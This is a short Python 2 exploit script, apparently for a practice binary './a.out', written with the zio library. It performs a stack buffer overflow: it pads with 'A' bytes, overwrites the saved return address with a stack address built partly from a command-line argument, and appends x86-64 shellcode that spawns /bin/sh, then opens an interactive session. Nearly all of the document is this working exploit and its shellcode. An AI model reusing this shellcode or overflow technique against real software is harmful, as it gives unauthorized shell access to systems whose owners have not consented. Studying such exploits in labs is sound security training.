#!/usr/bin/env python
# encoding:utf-8
from zio import *
import sys

Io = zio("./a.out")
#addr = Io.readline()[2:-1] # 去掉 0x 和 换行
#address = int(addr, 16)
address = int("7fffffffe4" + sys.argv[1], 16)

info = "A" * 4 * (ord("S") - ord("A"))
#rip = l64(0x7fffffffe488 + 8)
#rip = "\x88\xe4\xff\xff\xff\xff\xff\x7f"
rip = l64(address + 0x08)
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
payload = info + rip + shellcode

print hex(address)
Io.write(payload)
Io.interact()
